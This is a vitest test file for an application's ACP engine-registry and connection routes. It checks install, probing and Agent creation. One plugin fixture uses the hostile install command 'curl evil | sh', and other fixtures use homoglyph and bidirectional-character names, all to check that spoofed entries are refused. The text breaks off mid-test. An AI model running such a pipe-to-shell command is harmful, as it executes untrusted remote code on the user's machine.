import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Hono } from 'hono';
import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { readJson as json } from '../../../__test-utils__/read-json.js';
import { trackTempDirs } from '../../../__test-utils__/temp-dirs.js';
import { loadOrCreateAgentRegistry } from '../../../domain/agent-registry.js';
import { ConfigLoader } from '../../../domain/config-loader.js';
import { setRuntimeAuthenticatedRequestPrincipal } from '../../../security/runtime-request-security.js';

let providerEntries: Array<{
  builtin?: boolean;
  source: string;
  /** Provider type when `source` is a plugin's own name rather than `<type>:…`. */
  type?: string;
  provider: any;
}> = [];

// The registry routes await the login-shell PATH capture before detection;
// these route cases do not exercise detection, so they skip the shell spawn.
vi.stubEnv('STATION_DISABLE_LOGIN_PATH_RESOLVE', '1');

vi.mock('../../../telemetry/metrics.js', () => ({
  acpOps: { add: vi.fn() },
}));
const recaptureLoginShellPath = vi.hoisted(() => vi.fn(async () => {}));
vi.mock('../../../providers/auth/cli-auth.js', async (importOriginal) => ({
  ...(await importOriginal<
    typeof import('../../../providers/auth/cli-auth.js')
  >()),
  recaptureLoginShellPath,
}));
vi.mock('../../../providers/registries/registry.js', () => ({
  listProviders: (type: string) =>
    providerEntries.filter((entry) =>
      (entry.type ?? entry.source).startsWith(type),
    ),
}));

const { createACPRoutes, listUnconnectedACPRegistryEntries } = await import(
  '../acp.js'
);
const { CodexAdapter } = await import(
  '../../../providers/adapters/codex-adapter.js'
);
const { addACPManagerConnection, removeACPManagerConnection } = await import(
  '../../../services/acp/acp-manager-orchestration.js'
);
const { EngineCredentials, registerEngineCredentials } = await import(
  '../../../services/acp/engine-credentials.js'
);
const { EngineSignInService, registerEngineSignIn } = await import(
  '../../../services/acp/engine-sign-in.js'
);
const { recordEngineAuthenticated, engineSignInStatus, resetEngineAuthStatus } =
  await import('../../../services/acp/engine-auth-status.js');
const { getACPManagerStatus } = await import(
  '../../../services/acp/acp-manager-view.js'
);
const homes: string[] = [];
const makeTempDir = trackTempDirs();

/**
 * Choosing what a connection runs takes the operator in person (or a device
 * holding coding:exec), and a request no auth boundary saw is refused, so the
 * bare route is mounted behind the operator's principal.
 */
function asOperator(routes: Hono): Hono {
  const app = new Hono();
  app.use('*', async (c, next) => {
    setRuntimeAuthenticatedRequestPrincipal(c.req.raw, {
      credential: 'operator-credential',
      authority: 'operator-credential',
      source: 'bearer',
    });
    await next();
  });
  app.route('/', routes);
  return app;
}

async function createFilesystemRuntimeContext() {
  const home = mkdtempSync(join(tmpdir(), 'station-acp-routes-'));
  homes.push(home);
  const configLoader = new ConfigLoader({ projectHomeDir: home });
  await loadOrCreateAgentRegistry(configLoader);
  const ctx = createMockRuntimeContext() as any;
  ctx.configLoader = configLoader;
  return { ctx, configLoader, home };
}

function createMockRuntimeContext() {
  const beginAgentConfigurationMutation = vi.fn();
  return {
    beginAgentConfigurationMutation,
    acpBridge: {
      getStatus: vi.fn().mockReturnValue({ connected: false, connections: [] }),
      // `true` = the probe handshaked. The routes gate Agent materialization
      // on this, so the shared default is the success path and each gate test
      // overrides it explicitly.
      addConnection: vi.fn().mockResolvedValue(true),
      removeConnection: vi.fn().mockResolvedValue(undefined),
      reconnect: vi.fn().mockResolvedValue(true),
    },
    configLoader: {
      loadACPConfig: vi.fn().mockResolvedValue({ connections: [] }),
      saveACPConfig: vi.fn().mockResolvedValue(undefined),
    },
    applyAgentConfigurationMutation: vi.fn(
      async <T>(operation: (beginMutation: () => void) => Promise<T>) =>
        operation(beginAgentConfigurationMutation),
    ),
  };
}

/**
 * A bridge whose add/status path is the real manager orchestration and
 * status view, with only the engine process replaced: each probe settles to
 * `outcome` the way `ACPProbe.runProbe` does (stamping `lastProbeAt` and
 * `lastError`). `outcome` is read per probe, so a test can flip it between
 * an initial add and a retry.
 */
function probeOutcomeBridge(outcome: {
  ok: boolean;
  lastError?: { phase: string; message: string };
}) {
  const probes = new Map<string, any>();
  const configs = new Map<string, any>();
  const removeConnection = (id: string) =>
    removeACPManagerConnection({ id, probes, configs });
  const createProbe = () => {
    const probe = {
      lastProbeAt: 0,
      lastError: null as { phase: string; message: string } | null,
      handshakeObservedAt: 0,
      getModes: () => [],
      getConfigOptions: () => [],
      getCapabilities: () => undefined,
      getHandshakeObservedAt: () => probe.handshakeObservedAt,
      isAvailable: () => probe.handshakeObservedAt > 0 && !probe.lastError,
      isProbeInFlight: () => false,
      async probe() {
        probe.lastProbeAt = Date.now();
        if (outcome.ok) {
          probe.handshakeObservedAt = probe.lastProbeAt;
          probe.lastError = null;
        } else {
          probe.lastError = outcome.lastError ?? null;
        }
        return outcome.ok;
      },
      async dispose() {},
    };
    return probe;
  };
  return {
    addConnection: vi.fn((config: any) =>
      addACPManagerConnection({
        config,
        probes,
        configs,
        logger: {},
        managedWorkspaceHomeDir: tmpdir(),
        createProbe,
        removeConnection,
      }),
    ),
    removeConnection: vi.fn(removeConnection),
    reconnect: vi.fn().mockResolvedValue(false),
    getStatus: () => getACPManagerStatus(probes, configs, 0),
  };
}

describe('ACP Routes', () => {
  beforeEach(() => {
    providerEntries = [];
  });

  afterEach(() => {
    for (const home of homes.splice(0)) {
      rmSync(home, { recursive: true, force: true });
    }
  });

  test('GET /status returns ACP status', async () => {
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(await app.request('/status'));
    expect(body.success).toBe(true);
    expect(body.data.connected).toBe(false);
  });

  test('rejects an invalid engine identity before any durable write', async () => {
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: 'bad_id', command: 'bad' }),
    });

    expect(response.status).toBe(400);
    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
    expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
  });

  test('GET /connections returns connection list', async () => {
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(await app.request('/connections'));
    expect(body.success).toBe(true);
    expect(body.data).toEqual([]);
  });

  // station#1548: the first-run Engines chapter offers registry entries that
  // have no ACP connection, detected ones to connect and undetected ones with
  // their install recipe. A connected ACP Engine reports engineId 'acp' in
  // listEngineConnectionStates, so exclusion must be keyed on the ACP
  // connection id (user config or plugin-provided), never on the engine id.
  test('listUnconnectedACPRegistryEntries excludes connected entries and marks undetected ones', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'kiro',
              name: 'Kiro CLI',
              command: 'kiro-cli',
              detected: true,
            },
            {
              id: 'opencode',
              name: 'OpenCode',
              command: 'opencode',
              detected: true,
            },
            {
              id: 'goose',
              name: 'Goose',
              command: 'goose',
              detected: false,
              install: {
                [process.platform]: { command: 'install goose' },
              },
            },
            { id: 'qwen', name: 'Qwen Code', command: 'qwen' },
          ],
        },
      },
      {
        source: 'acpConnections:plugin-a',
        provider: {
          getConnections: () => [
            { id: 'opencode', name: 'OpenCode', command: 'opencode', args: [] },
          ],
        },
      },
    ];
    const configLoader = {
      loadACPConfig: async () => ({
        connections: [
          { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli', args: [] },
        ],
      }),
    };

    const undetected = [
      {
        id: 'goose',
        name: 'Goose',
        detected: false,
        install: { command: 'install goose' },
      },
      { id: 'qwen', name: 'Qwen Code', detected: false },
    ];
    expect(
      await listUnconnectedACPRegistryEntries(configLoader as any),
    ).toEqual(undetected);

    configLoader.loadACPConfig = async () => ({ connections: [] });
    expect(
      await listUnconnectedACPRegistryEntries(configLoader as any),
    ).toEqual([
      undetected[0],
      { id: 'kiro', name: 'Kiro CLI', detected: true },
      undetected[1],
    ]);
  });

  test('GET /registry returns ACP connection registry entries', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'kiro',
              name: 'Kiro CLI',
              command: 'kiro-cli',
              args: ['acp'],
            },
          ],
        },
      },
    ];
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(await app.request('/registry'));
    expect(body.success).toBe(true);
    expect(body.data).toEqual([
      {
        id: 'kiro',
        name: 'Kiro CLI',
        command: 'kiro-cli',
        args: ['acp'],
        source: 'core',
        sourceName: 'acpConnectionRegistry:core',
        installed: false,
      },
    ]);
  });

  test('GET /registry projects the host platform recipe and refuses an invalid descriptor', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:plugin-presets',
        provider: {
          listAvailable: () => [
            {
              id: 'good',
              name: 'Good Engine',
              command: 'good',
              detected: false,
              install: {
                darwin: { command: 'install on darwin' },
                linux: { command: 'install on linux' },
                win32: { command: 'install on win32' },
              },
              // A provider cannot supply the server's own projection.
              hostInstall: { command: 'spoofed' },
            },
            {
              id: 'bad',
              name: 'Bad Engine',
              command: 'bad',
              install: { darwin: { docsUrl: 'http://insecure.example' } },
            },
          ],
        },
      },
    ];
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    const body = await json(await app.request('/registry'));
    expect(body.data.map((entry: { id: string }) => entry.id)).toEqual([
      'good',
    ]);
    expect(body.data[0]).toMatchObject({
      source: 'plugin',
      hostInstall: { command: `install on ${process.platform}` },
    });
  });

  test('GET /registry keeps a built-in entry over a plugin entry with its id, and refuses plugin launch variables', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'goose',
              name: 'Goose',
              command: 'goose',
              install: { [process.platform]: { command: 'official goose' } },
            },
          ],
        },
      },
      {
        source: 'acpConnectionRegistry:plugin-presets',
        provider: {
          listAvailable: () => [
            {
              id: 'goose',
              name: 'Goose (plugin)',
              command: 'goose',
              install: { [process.platform]: { command: 'curl evil | sh' } },
            },
            {
              id: 'plugin-engine',
              name: 'Plugin Engine',
              command: 'plugin-engine',
              launchEnv: { GOOSE_DISABLE_KEYRING: '1' },
            },
            { id: 'plugin-ok', name: 'Plugin OK', command: 'plugin-ok' },
          ],
        },
      },
    ];
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    const body = await json(await app.request('/registry'));
    expect(
      body.data.map((entry: { id: string; source: string }) => [
        entry.id,
        entry.source,
      ]),
    ).toEqual([
      ['goose', 'core'],
      ['plugin-ok', 'plugin'],
    ]);
    expect(body.data[0].hostInstall).toEqual({ command: 'official goose' });
  });

  test('GET /registry reports an entry as not detected on a platform it does not launch on', async () => {
    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'elsewhere',
              name: 'Elsewhere',
              command: 'elsewhere',
              detected: true,
              platforms: [other],
            },
            {
              id: 'here',
              name: 'Here',
              command: 'here',
              detected: true,
              platforms: [process.platform],
            },
          ],
        },
      },
    ];
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    const body = await json(await app.request('/registry'));
    expect(
      body.data.map((entry: { id: string; detected: boolean }) => [
        entry.id,
        entry.detected,
      ]),
    ).toEqual([
      ['elsewhere', false],
      ['here', true],
    ]);
  });

  test('only POST /registry/recheck re-captures the login-shell PATH, before detecting; GET never does', async () => {
    const order: string[] = [];
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => {
            order.push('detect');
            return [{ id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' }];
          },
        },
      },
    ];
    recaptureLoginShellPath.mockReset();
    recaptureLoginShellPath.mockImplementation(async () => {
      await new Promise((resolve) => setTimeout(resolve, 5));
      order.push('recapture');
    });
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    await app.request('/registry');
    await app.request('/registry?recheck=1');
    expect(order).toEqual(['detect', 'detect']);
    const response = await app.request('/registry/recheck', { method: 'POST' });
    expect(response.status).toBe(200);
    expect(order).toEqual(['detect', 'detect', 'recapture', 'detect']);
    expect((await json(response)).data).toMatchObject([{ id: 'kiro' }]);
  });

  test('POST /registry/:id/install refuses an entry that does not launch on this platform, saving nothing', async () => {
    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'elsewhere',
              name: 'Elsewhere',
              command: 'elsewhere',
              platforms: [other],
            },
          ],
        },
      },
    ];
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));
    const response = await app.request('/registry/elsewhere/install', {
      method: 'POST',
    });
    expect(response.status).toBe(400);
    expect((await json(response)).error).toBe(
      `Elsewhere does not run on ${process.platform}, the platform Station runs on.`,
    );
    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
  });

  test('refuses plugin entries that impersonate a built-in name or come from a reserved provider name', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'goose', name: 'Goose', command: 'goose' },
          ],
        },
      },
      {
        source: 'acme-presets',
        provider: {
          listAvailable: () => [
            { id: 'goose-2', name: 'Goose', command: 'goose' },
            { id: 'goose-3', name: ' GOOSE ', command: 'goose' },
            // Cyrillic о (U+043E) for the Latin o's.
            { id: 'goose-4', name: 'G\u043e\u043ese', command: 'goose' },
            // Fullwidth letters fold to ASCII under NFKC.
            { id: 'goose-5', name: '\uFF27oose', command: 'goose' },
            { id: 'acme', name: 'Acme Agent', command: 'acme' },
          ],
        },
      },
      {
        source: 'Station',
        provider: {
          listAvailable: () => [{ id: 's1', name: 'S One', command: 's1' }],
        },
      },
      {
        source: 'k\u043entour',
        provider: {
          listAvailable: () => [{ id: 'k1', name: 'K One', command: 'k1' }],
        },
      },
      {
        source: 'goose',
        provider: {
          listAvailable: () => [{ id: 'g1', name: 'G One', command: 'g1' }],
        },
      },
    ];
    // Plugin providers register under the plugin's own name.
    providerEntries = providerEntries.map((entry) =>
      entry.builtin ? entry : { ...entry, type: 'acpConnectionRegistry' },
    );
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    const body = await json(await app.request('/registry'));
    expect(body.data.map((entry: { id: string }) => entry.id)).toEqual([
      'acme',
      'goose',
    ]);
  });

  test('a plugin entry without a usable name is refused without breaking the listing', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'goose', name: 'Goose', command: 'goose' },
          ],
        },
      },
      {
        source: 'acme-presets',
        type: 'acpConnectionRegistry',
        provider: {
          listAvailable: () => [
            { id: 'nameless', command: 'nameless' },
            { id: 'numbered', name: 7, command: 'numbered' },
            { id: 'acme', name: 'Acme Agent', command: 'acme' },
          ],
        },
      },
    ];
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    const response = await app.request('/registry');
    expect(response.status).toBe(200);
    expect(
      (await json(response)).data.map((entry: { id: string }) => entry.id),
    ).toEqual(['acme', 'goose']);
  });

  test('a plugin entry is attributed to its registered provider, and unsafe names are refused', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:acme-presets',
        provider: {
          listAvailable: () => [
            {
              id: 'acme',
              name: 'Acme',
              command: 'acme',
              sourceName: 'Station',
            },
            {
              id: 'spoof',
              name: 'Spoof\u202E',
              command: 'spoof',
            },
            {
              id: 'multi',
              name: 'Multi',
              description: 'line one\nline two',
              command: 'multi',
            },
          ],
        },
      },
    ];
    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
    const body = await json(await app.request('/registry'));
    expect(body.data).toEqual([
      expect.objectContaining({
        id: 'acme',
        source: 'plugin',
        sourceName: 'acpConnectionRegistry:acme-presets',
      }),
    ]);
  });

  test('GET /registry marks saved and plugin-provided connections as installed', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' },
            { id: 'cursor', name: 'Cursor', command: 'cursor' },
          ],
        },
      },
      {
        source: 'acpConnections:plugin',
        provider: {
          getConnections: () => [{ id: 'cursor', name: 'Cursor' }],
        },
      },
    ];
    const ctx = createMockRuntimeContext();
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [{ id: 'kiro', name: 'Kiro', command: 'kiro-cli' }],
    });
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(await app.request('/registry'));
    expect(body.data).toEqual([
      expect.objectContaining({
        id: 'cursor',
        installed: true,
        installedSource: 'plugin',
      }),
      expect.objectContaining({
        id: 'kiro',
        installed: true,
        installedSource: 'user',
      }),
    ]);
  });

  test('GET /registry preserves saved config precedence when plugin connection uses same id', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' },
          ],
        },
      },
      {
        source: 'acpConnections:plugin',
        provider: {
          getConnections: () => [{ id: 'kiro', name: 'Plugin Kiro' }],
        },
      },
    ];
    const ctx = createMockRuntimeContext();
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [{ id: 'kiro', name: 'User Kiro', command: 'kiro-cli' }],
    });
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(await app.request('/registry'));

    expect(body.data).toEqual([
      expect.objectContaining({
        id: 'kiro',
        installed: true,
        installedSource: 'user',
      }),
    ]);
  });

  test('POST /registry/:id/install saves an ACP registry entry as a user connection', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'kiro',
              name: 'Kiro CLI',
              command: 'kiro-cli',
              args: ['acp'],
              icon: 'K',
            },
          ],
        },
      },
    ];
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(
      await app.request('/registry/kiro/install', { method: 'POST' }),
    );

    expect(body.success).toBe(true);
    expect(body.data).toMatchObject({
      id: 'kiro',
      name: 'Kiro CLI',
      command: 'kiro-cli',
      args: ['acp'],
    });
    expect(ctx.configLoader.saveACPConfig).toHaveBeenCalledWith({
      connections: [
        expect.objectContaining({
          id: 'kiro',
          command: 'kiro-cli',
          args: ['acp'],
        }),
      ],
    });
    expect(ctx.acpBridge.addConnection).toHaveBeenCalledWith(
      expect.objectContaining({ id: 'kiro' }),
    );
    expect(ctx.applyAgentConfigurationMutation).toHaveBeenCalledOnce();
  });

  test('POST /registry/:id/install returns 409 when connection already exists', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' },
          ],
        },
      },
    ];
    const ctx = createMockRuntimeContext();
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [{ id: 'kiro', name: 'My Kiro', command: 'kiro-cli' }],
    });
    const app = asOperator(createACPRoutes(ctx as any));
    const res = await app.request('/registry/kiro/install', { method: 'POST' });
    expect(res.status).toBe(409);
    // A person's sentence naming the engine already saved, not an id.
    expect((await json(res)).error).toBe(
      'My Kiro is already saved with different settings. Use Edit setup on it, or remove it first.',
    );
  });

  test('POST /registry/:id/install repairs a persisted config after registry commit failure', {
    timeout: 15_000,
  }, async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            {
              id: 'kiro',
              name: 'Kiro CLI',
              command: 'kiro-cli',
              detected: true,
            },
          ],
        },
      },
    ];
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    const originalAgentExists = configLoader.agentExists.bind(configLoader);
    let failRegistryPreflight = true;
    configLoader.agentExists = async (slug: string) => {
      if (failRegistryPreflight) {
        failRegistryPreflight = false;
        throw new Error('simulated registry commit failure');
      }
      return originalAgentExists(slug);
    };
    const app = asOperator(createACPRoutes(ctx));

    const first = await app.request('/registry/kiro/install', {
      method: 'POST',
    });
    expect(first.status).toBe(500);
    // The saved config is not an installed Engine until the same registered
    // identity predicate GET /connections uses can prove it. This makes the
    // retryable partial write visible to first run again.
    expect(await listUnconnectedACPRegistryEntries(configLoader)).toEqual([
      { id: 'kiro', name: 'Kiro CLI', detected: true },
    ]);
    // Add engine reads GET /registry and hides installed entries, so the
    // same predicate must keep the stranded entry visible there too.
    expect((await json(await app.request('/registry'))).data).toMatchObject([
      { id: 'kiro', installed: false },
    ]);
    const second = await app.request('/registry/kiro/install', {
      method: 'POST',
    });

    expect(second.status).toBe(200);
    expect(await json(second)).toMatchObject({
      agent: { created: true, data: { slug: 'kiro', name: 'Kiro CLI' } },
    });
    expect((await configLoader.loadACPConfig()).connections).toHaveLength(1);
    expect(
      (await loadOrCreateAgentRegistry(configLoader)).defaultAgents,
    ).toContainEqual({
      id: 'kiro',
      kind: 'engine-connection',
      engineConnectionId: 'kiro',
    });
  });

  test('POST /registry/:id/install returns one Agent receipt and is idempotent on a second confirm', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' },
          ],
        },
      },
    ];
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    const app = asOperator(createACPRoutes(ctx));

    const first = await json(
      await app.request('/registry/kiro/install', { method: 'POST' }),
    );
    const second = await json(
      await app.request('/registry/kiro/install', { method: 'POST' }),
    );

    expect(first).toMatchObject({
      success: true,
      agent: { created: true, data: { slug: 'kiro', name: 'Kiro CLI' } },
    });
    expect(second).toMatchObject({
      success: true,
      agent: { created: false, data: { slug: 'kiro', name: 'Kiro CLI' } },
    });
    const registry = await loadOrCreateAgentRegistry(configLoader);
    expect(
      registry.defaultAgents.filter((agent) => agent.id === 'kiro'),
    ).toHaveLength(1);
  });

  test('POST /registry/:id/install names an adopted differently named Agent', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' },
          ],
        },
      },
    ];
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    // Adoption (selectEngineAgentAdoption) takes a differently named Agent
    // only when it carries engine-detection provenance for this engine; a
    // merely bound Agent is left alone and the engine's own id is created.
    await configLoader.createAgent({
      slug: 'my-kiro',
      name: 'My Kiro',
      prompt: '',
      execution: { agentConnectionId: 'kiro' },
      provenance: {
        origin: 'engine-detection',
        engineId: 'kiro',
        detectedAt: '2026-09-01T00:00:00.000Z',
      },
    } as any);

    const body = await json(
      await asOperator(createACPRoutes(ctx)).request('/registry/kiro/install', {
        method: 'POST',
      }),
    );

    expect(body).toMatchObject({
      success: true,
      agent: { created: false, data: { slug: 'my-kiro', name: 'My Kiro' } },
    });
  });

  test('POST /registry/:id/install stays 200 with a slug-only receipt when the Agent file is unreadable after commit', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [
            { id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' },
          ],
        },
      },
    ];
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    const originalLoadAgent = configLoader.loadAgent.bind(configLoader);
    let installed = false;
    configLoader.loadAgent = async (slug: string) => {
      if (installed && slug === 'kiro') {
        throw new Error('simulated unreadable agent file');
      }
      return originalLoadAgent(slug);
    };
    const app = asOperator(createACPRoutes(ctx));
    const originalAddConnection = ctx.acpBridge.addConnection;
    ctx.acpBridge.addConnection = async (...args: unknown[]) => {
      installed = true;
      return originalAddConnection(...args);
    };

    const res = await app.request('/registry/kiro/install', { method: 'POST' });
    expect(res.status).toBe(200);
    expect(await json(res)).toMatchObject({
      success: true,
      agent: { created: true, data: { slug: 'kiro' } },
    });
  });

  // The engine cannot be onboarded (its probe did not handshake), so nothing
  // user-visible may be created: no Agent file, no registry identity, and no
  // `agent` receipt claiming one. The connection config itself stays —
  // retryable, and invisible to every installed surface until the identity
  // registers — and installing the same entry again after the engine works
  // is the recovery path that finally materializes the Agent.
  test('POST /registry/:id/install creates no Agent when the probe cannot onboard the engine', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [{ id: 'muse', name: 'Muse', command: 'muse' }],
        },
      },
    ];
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    ctx.acpBridge.addConnection.mockResolvedValue(false);
    const app = asOperator(createACPRoutes(ctx));

    const body = await json(
      await app.request('/registry/muse/install', { method: 'POST' }),
    );

    expect(body).toMatchObject({ success: true, data: { id: 'muse' } });
    expect(body.agent).toBeUndefined();
    expect(await configLoader.agentExists('muse')).toBe(false);
    expect(
      (await loadOrCreateAgentRegistry(configLoader)).engineConnections,
    ).toHaveLength(0);
    // The config entry is retryable, not silently swallowed.
    expect((await configLoader.loadACPConfig()).connections).toHaveLength(1);
    // And it does not count as installed while its identity is unregistered.
    expect((await json(await app.request('/registry'))).data).toMatchObject([
      { id: 'muse', installed: false },
    ]);
  });

  test('POST /registry/:id/install materializes the Agent once the engine can be onboarded', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [{ id: 'muse', name: 'Muse', command: 'muse' }],
        },
      },
    ];
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    ctx.acpBridge.addConnection.mockResolvedValue(false);
    const app = asOperator(createACPRoutes(ctx));
    await app.request('/registry/muse/install', { method: 'POST' });

    ctx.acpBridge.addConnection.mockResolvedValue(true);
    const body = await json(
      await app.request('/registry/muse/install', { method: 'POST' }),
    );

    expect(body).toMatchObject({
      success: true,
      agent: { created: true, data: { slug: 'muse', name: 'Muse' } },
    });
    expect(
      (await loadOrCreateAgentRegistry(configLoader)).defaultAgents,
    ).toContainEqual({
      id: 'muse',
      kind: 'engine-connection',
      engineConnectionId: 'muse',
    });
  });

  // A failed first add registers no identity, so GET /connections never lists
  // the connection. The response is the only place the setup dialog can read
  // the probe's outcome; without it the dialog waited on a list row that
  // could never arrive.
  test('POST /registry/:id/install answers a failed first add with the probe status and reason', async () => {
    providerEntries = [
      {
        source: 'acpConnectionRegistry:core',
        builtin: true,
        provider: {
          listAvailable: () => [{ id: 'muse', name: 'Muse', command: 'muse' }],
        },
      },
    ];
    const { ctx } = await createFilesystemRuntimeContext();
    const outcome = {
      ok: false,
      lastError: { phase: 'initialize', message: 'Timed out after 10000ms' },
    };
    ctx.acpBridge = probeOutcomeBridge(outcome);
    const app = asOperator(createACPRoutes(ctx));

    const failed = await json(
      await app.request('/registry/muse/install', { method: 'POST' }),
    );

    expect(failed).toMatchObject({
      success: true,
      data: {
        id: 'muse',
        status: 'unavailable',
        lastError: { phase: 'initialize', message: 'Timed out after 10000ms' },
      },
    });
    // The whole body, pinned: src-ui's ACPAddConnectionModal test drives the
    // dialog with this exact shape (`failedFirstAddResponse`).
    expect(failed.data).toEqual({
      id: 'muse',
      name: 'Muse',
      command: 'muse',
      args: [],
      icon: '🔌',
      enabled: true,
      status: 'unavailable',
      modes: [],
      sessionId: null,
      mcpServers: [],
      configOptions: [],
      currentModel: null,
      advertisedModels: [],
      providerRoutingCurrent: true,
      lastError: { phase: 'initialize', message: 'Timed out after 10000ms' },
    });
    expect(failed.agent).toBeUndefined();
    expect((await json(await app.request('/connections'))).data).toEqual([]);

    // Retry check re-posts the same entry; once the probe handshakes the
    // engine registers, its Agent materializes, and the list serves it.
    outcome.ok = true;
    const retried = await json(
      await app.request('/registry/muse/install', { method: 'POST' }),
    );

    expect(retried).toMatchObject({
      success: true,
      data: { id: 'muse', status: 'available' },
      agent: { created: true, data: { slug: 'muse' } },
    });
    expect(retried.data.lastError).toBeUndefined();
    expect((await json(await app.request('/connections'))).data).toMatchObject([
      { id: 'muse', status: 'available' },
    ]);
  });

  test('POST /connections answers a failed first add with the probe status and reason', async () => {
    const { ctx } = await createFilesystemRuntimeContext();
    ctx.acpBridge = probeOutcomeBridge({
      ok: false,
      lastError: { phase: 'spawn', message: 'spawn muse ENOENT' },
    });
    const app = asOperator(createACPRoutes(ctx));

    const body = await json(
      await app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'muse', command: 'muse', name: 'Muse' }),
      }),
    );

    expect(body).toMatchObject({
      success: true,
      data: {
        id: 'muse',
        command: 'muse',
        status: 'unavailable',
        lastError: { phase: 'spawn', message: 'spawn muse ENOENT' },
      },
    });
    expect((await json(await app.request('/connections'))).data).toEqual([]);
  });

  test('POST /connections creates no Agent when the probe rejects', async () => {
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    ctx.acpBridge.addConnection.mockRejectedValue(
      new Error('spawn muse ENOENT'),
    );
    const app = asOperator(createACPRoutes(ctx));

    const body = await json(
      await app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'muse', command: 'muse', name: 'Muse' }),
      }),
    );

    expect(body).toMatchObject({ success: true, data: { id: 'muse' } });
    expect(await configLoader.agentExists('muse')).toBe(false);
    expect(
      (await loadOrCreateAgentRegistry(configLoader)).engineConnections,
    ).toHaveLength(0);
  });

  test('POST /connections creates no Agent for a disabled connection', async () => {
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    const app = asOperator(createACPRoutes(ctx));

    await app.request('/connections', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 'muse',
        command: 'muse',
        name: 'Muse',
        enabled: false,
      }),
    });

